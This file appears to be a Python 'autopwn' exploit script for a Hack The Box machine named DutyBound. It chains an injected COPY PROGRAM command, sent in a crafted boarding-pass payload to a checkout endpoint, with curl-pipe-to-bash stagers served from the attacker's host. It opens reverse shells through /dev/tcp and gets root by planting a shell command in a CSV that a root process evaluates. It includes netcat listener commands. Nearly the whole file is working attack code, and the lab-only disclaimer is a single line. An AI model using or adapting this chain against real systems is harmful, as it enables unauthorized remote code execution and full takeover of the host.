#!/usr/bin/env python3
"""
DutyBound autopwn from Kali (HTB VPN).

  python3 autopwn.py --target 10.129.x.x --lhost 10.10.x.x

In other terminals, before --fire:

  nc -lvnp 6666    # dutyfree-kiosk
  nc -lvnp 7777    # root (vrs-duty-apply eval)

Authorized HTB / own lab only.
"""
from __future__ import annotations

import argparse
import http.server
import json
import os
import ssl
import sys
import threading
import time
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from bcbp import copy_program  # noqa: E402

HERE = Path(__file__).resolve().parent


def opener():
    ctx = ssl._create_unverified_context()
    return urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))


def post(op, url, obj, timeout=20):
    req = urllib.request.Request(
        url,
        data=json.dumps(obj).encode(),
        headers={"Content-Type": "application/json", "Host": "airsnacks.htb"},
    )
    try:
        with op.open(req, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()
    except Exception as e:
        return "EX", type(e).__name__ + ": " + str(e)


def serve(www: Path, port: int) -> http.server.ThreadingHTTPServer:
    handler = http.server.SimpleHTTPRequestHandler
    os.chdir(www)

    class Quiet(handler):
        def log_message(self, fmt, *args):
            print("[http]", fmt % args, flush=True)

    httpd = http.server.ThreadingHTTPServer(("0.0.0.0", port), Quiet)
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    return httpd


def write_stage(www: Path, lhost: str, http_port: int, kiosk_port: int, root_port: int) -> None:
    xinject = (HERE / "03-xinject.py").read_text()
    (www / "xinject.py").write_text(xinject)
    kiosk_cmd = f"curl -fsS http://{lhost}:{http_port}/kiosk.sh | bash"
    (www / "stager.sh").write_text(
        "#!/bin/bash\n"
        f"curl -fsS http://{lhost}:{http_port}/xinject.py -o /tmp/xinject.py\n"
        f"python3 /tmp/xinject.py --cmd {kiosk_cmd!r}\n"
    )
    (www / "kiosk.sh").write_text(
        "#!/bin/bash\n"
        f"(bash -i >& /dev/tcp/{lhost}/{kiosk_port} 0>&1) &\n"
        "cat > /opt/vrs/data/duty-rates.csv << 'CSV'\n"
        "SPIRITS,45,20\n"
        "WINE,25,20\n"
        "BEER,25,20\n"
        "SOFT_DRINKS,20,20\n"
        "SNACKS,20,20\n"
        "CONFECTIONERY,20,20\n"
        "WATER,0,0\n"
        f'bash -c "bash -i >& /dev/tcp/{lhost}/{root_port} 0>&1";x,1,0\n'
        "CSV\n"
        "sleep 0.2\n"
        "touch /opt/vrs/data/duty-rates.csv\n"
    )


def main() -> None:
    p = argparse.ArgumentParser()
    p.add_argument("--target", required=True)
    p.add_argument("--lhost", required=True, help="Kali tun0")
    p.add_argument("--http-port", type=int, default=8088)
    p.add_argument("--kiosk-port", type=int, default=6666)
    p.add_argument("--root-port", type=int, default=7777)
    p.add_argument("--sku", default="CNF-JLY-300")
    p.add_argument("--timeout", type=float, default=15)
    p.add_argument("--www", default="/tmp/dutybound-www")
    args = p.parse_args()

    www = Path(args.www)
    www.mkdir(parents=True, exist_ok=True)
    write_stage(www, args.lhost, args.http_port, args.kiosk_port, args.root_port)
    httpd = serve(www, args.http_port)
    print(f"[*] http://{args.lhost}:{args.http_port}/  serving {www}")
    print("[*] listeners (other terminals):")
    print(f"    nc -lvnp {args.kiosk_port}   # dutyfree-kiosk")
    print(f"    nc -lvnp {args.root_port}    # root")

    cmd = f"curl -fsS http://{args.lhost}:{args.http_port}/stager.sh|bash"
    raw = copy_program(cmd)
    print(f"[*] COPY PROGRAM {cmd!r}  (BCBP {len(raw)} bytes)")

    op = opener()
    base = f"https://{args.target}"
    st, body = post(op, base + "/cart/add", {"sku": args.sku})
    print("[*] cart", st, body.strip()[:160])
    st, body = post(
        op, base + "/checkout/boarding-pass/verify", {"raw": raw}, timeout=args.timeout
    )
    print("[*] verify", st, str(body)[:300])
    print("[*] COPY holds until stager exits (xinject ~2s). Keep this process for HTTP.")
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        httpd.shutdown()


if __name__ == "__main__":
    main()
